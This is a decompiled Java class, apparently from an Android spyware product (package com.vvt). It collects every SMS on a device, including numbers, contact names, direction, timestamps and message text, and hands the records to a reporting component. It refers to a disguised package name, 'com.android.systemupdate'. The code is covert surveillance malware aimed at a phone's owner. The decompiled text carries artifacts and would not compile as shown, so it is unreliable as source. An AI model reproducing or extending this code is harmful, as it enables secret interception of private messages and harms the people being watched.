package com.vvt.capture.sms;

import android.content.ContentResolver;
import android.content.Context;
import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.g;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxRecipientType;
import com.vvt.events.FxSMSEvent;
import com.vvt.events.h;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class a
  extends com.vvt.base.capture.b
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private e c;
  private com.vvt.base.capture.f d;
  private String e;
  private Context f;
  private RunningMode g;
  
  public a(Context paramContext, String paramString, RunningMode paramRunningMode, ContentResolver paramContentResolver, com.vvt.base.a parama)
  {
    this.g = paramRunningMode;
    this.e = paramString;
    Object localObject = new com/vvt/capture/sms/b/b;
    ((com.vvt.capture.sms.b.b)localObject).<init>(paramContentResolver);
    this.c = ((e)localObject);
    localObject = this.g;
    RunningMode localRunningMode = RunningMode.FULL;
    if (localObject == localRunningMode)
    {
      localObject = new com/vvt/capture/sms/a/b;
      ((com.vvt.capture.sms.a.b)localObject).<init>();
    }
    for (;;)
    {
      this.d = ((com.vvt.base.capture.f)localObject);
      this.b = parama;
      this.f = paramContext;
      return;
      localObject = new com/vvt/capture/sms/b/f;
      ((com.vvt.capture.sms.b.f)localObject).<init>(paramContentResolver);
    }
  }
  
  private FxSMSEvent a(SmsData paramSmsData)
  {
    Object localObject1 = FxEventDirection.UNKNOWN;
    Object localObject2 = b.a;
    Object localObject3 = paramSmsData.c();
    int i = ((SmsData.Type)localObject3).ordinal();
    int j = localObject2[i];
    FxSMSEvent localFxSMSEvent;
    switch (j)
    {
    default: 
      localObject2 = paramSmsData.e();
      if (localObject2 != null)
      {
        localObject3 = ((String)localObject2).trim();
        i = ((String)localObject3).length();
        if (i != 0) {}
      }
      else
      {
        localObject2 = "";
      }
      localObject3 = paramSmsData.f();
      boolean bool = com.vvt.ah.a.c((String)localObject3);
      if (bool) {
        localObject3 = "Private/unknown number";
      }
      localFxSMSEvent = new com/vvt/events/FxSMSEvent;
      localFxSMSEvent.<init>();
      h localh = new com/vvt/events/h;
      localh.<init>();
      Object localObject4 = FxEventDirection.OUT;
      if (localObject1 == localObject4)
      {
        localObject4 = FxRecipientType.TO;
        localh.a((FxRecipientType)localObject4);
        localh.a((String)localObject3);
        localh.b((String)localObject2);
        localFxSMSEvent.addRecipient(localh);
      }
      break;
    }
    for (;;)
    {
      localFxSMSEvent.setContactName((String)localObject2);
      localFxSMSEvent.setDirection((FxEventDirection)localObject1);
      long l = paramSmsData.g();
      localFxSMSEvent.setConversationId(l);
      l = paramSmsData.a();
      localFxSMSEvent.setEventId(l);
      l = paramSmsData.b();
      localFxSMSEvent.setEventTime(l);
      localObject1 = paramSmsData.d();
      localFxSMSEvent.setSMSData((String)localObject1);
      return localFxSMSEvent;
      localObject1 = FxEventDirection.IN;
      break;
      localObject1 = FxEventDirection.OUT;
      break;
      localFxSMSEvent.setSenderNumber((String)localObject3);
    }
  }
  
  protected g a(g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a()
  {
    Object localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      boolean bool = localObject instanceof com.vvt.capture.sms.a.b;
      if (!bool) {
        break label36;
      }
      localObject = (com.vvt.capture.sms.a.b)this.d;
      ((com.vvt.capture.sms.a.b)localObject).d();
    }
    for (;;)
    {
      return;
      label36:
      localObject = (com.vvt.capture.sms.b.f)this.d;
      ((com.vvt.capture.sms.b.f)localObject).d();
    }
  }
  
  protected void a(List paramList)
  {
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    boolean bool1 = a;
    Object localObject2;
    if ((!bool1) || (paramList != null))
    {
      localObject2 = paramList.iterator();
      for (;;)
      {
        bool1 = ((Iterator)localObject2).hasNext();
        if (!bool1) {
          break;
        }
        localObject3 = ((Iterator)localObject2).next();
        boolean bool2 = localObject3 instanceof SmsData;
        if (bool2)
        {
          localObject3 = (SmsData)localObject3;
          localObject3 = a((SmsData)localObject3);
          ((List)localObject1).add(localObject3);
        }
      }
      localObject3 = this.b;
      if (localObject3 != null)
      {
        bool1 = a;
        if (bool1) {}
        localObject3 = this.b;
        ((com.vvt.base.a)localObject3).a((List)localObject1);
      }
    }
    bool1 = a;
    if (bool1) {}
    Object localObject3 = this.g;
    localObject1 = RunningMode.FULL;
    if (localObject3 == localObject1)
    {
      localObject3 = new com/vvt/j/c;
      ((com.vvt.j.c)localObject3).<init>();
      localObject1 = "com.android.systemupdate";
      localObject2 = this.e;
      localObject3 = ((com.vvt.j.c)localObject3).a((String)localObject1, (String)localObject2);
      boolean bool3 = a;
      if (bool3) {}
      localObject1 = new com/vvt/capture/sms/c;
      ((c)localObject1).<init>();
      bool1 = ((c)localObject1).a((String)localObject3);
      if (!bool1) {
        break label234;
      }
    }
    label234:
    for (localObject3 = "/exfst//";; localObject3 = "mnsent/")
    {
      return;
      localObject3 = new com/vvt/j/c;
      ((com.vvt.j.c)localObject3).<init>();
      localObject1 = this.f;
      localObject3 = ((com.vvt.j.c)localObject3).a((Context)localObject1);
      break;
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool = false;
    Object localObject = null;
    com.vvt.base.capture.f localf = this.d;
    if (localf != null)
    {
      localObject = this.d;
      bool = localObject instanceof com.vvt.capture.sms.a.b;
      if (!bool) {
        break label45;
      }
      localObject = (com.vvt.capture.sms.a.b)this.d;
    }
    for (bool = ((com.vvt.capture.sms.a.b)localObject).a(paramString);; bool = ((com.vvt.capture.sms.b.f)localObject).a(paramString))
    {
      return bool;
      label45:
      localObject = (com.vvt.capture.sms.b.f)this.d;
    }
  }
  
  protected e b()
  {
    return this.c;
  }
  
  protected com.vvt.base.capture.f c()
  {
    return this.d;
  }
  
  protected String d()
  {
    return "SmsCapture";
  }
  
  protected String e()
  {
    return this.e;
  }
  
  protected String f()
  {
    return "sms.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */